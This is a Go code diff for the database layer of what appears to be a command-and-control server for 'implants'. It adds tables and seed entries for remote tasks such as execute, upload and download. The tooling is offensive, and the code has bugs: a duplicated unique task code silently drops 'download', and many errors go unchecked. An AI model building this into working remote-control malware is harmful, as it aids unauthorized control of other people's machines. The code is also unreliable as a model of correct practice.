@@ -11,6 +11,7 @@ type Store interface {
 	CreateImplant(implant *Implant) error
 	GetImplants() ([]*Implant, error)
 	doesImplantExist(identifier string) (bool, error)
+	GetCommands() ([]*Command, error)
 }
 
 type dbStore struct {
@@ -34,6 +35,28 @@ func createDB(db *sql.DB) {
 					 identifier CHAR(20),
 					 ipaddress VARCHAR(11),
 					 lastcheckin TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
+					)`)
+
+	if err != nil {
+		panic(err)
+	}
+
+	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS commands (id INT(10) AUTO_INCREMENT PRIMARY KEY,
+					 task_code INT(10) UNIQUE, 
+					 name CHAR(20)
+					)`)
+
+	_, err = db.Exec(`INSERT IGNORE INTO commands(task_code, name) VALUES(?,?)`, "0", "execute")
+	_, err = db.Exec(`INSERT IGNORE INTO commands(task_code, name) VALUES(?,?)`, "1", "dir")
+	_, err = db.Exec(`INSERT IGNORE INTO commands(task_code, name) VALUES(?,?)`, "2", "ps")
+	_, err = db.Exec(`INSERT IGNORE INTO commands(task_code, name) VALUES(?,?)`, "3", "sleep")
+	_, err = db.Exec(`INSERT IGNORE INTO commands(task_code, name) VALUES(?,?)`, "4", "upload")
+	_, err = db.Exec(`INSERT IGNORE INTO commands(task_code, name) VALUES(?,?)`, "4", "download")
+
+	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS tasks (id INT(10) AUTO_INCREMENT PRIMARY KEY, 
+					 task_code INT(10),
+					 argument1 VARCHAR(1024),
+					 argument2 VARCHAR(1024)
 					)`)
 
 	if err != nil {
@@ -88,6 +111,29 @@ func (store *dbStore) doesImplantExist(identifier string) (bool, error) {
 		return false, err
 	}
 
+}
+
+func (store *dbStore) GetCommands() ([]*Command, error) {
+	rows, err := store.db.Query("SELECT * FROM commands")
+
+	if err != nil {
+		return nil, err
+	}
+
+	defer rows.Close()
+
+	commands := []*Command{}
+	for rows.Next() {
+		command := &Command{}
+		if err := rows.Scan(&command.Id, &command.Task_code, &command.Name); err != nil {
+			log.Println(err)
+			return nil, err
+		}
+
+		commands = append(commands, command)
+	}
+
+	return commands, nil
 }
 
 func InitStore(s Store) {
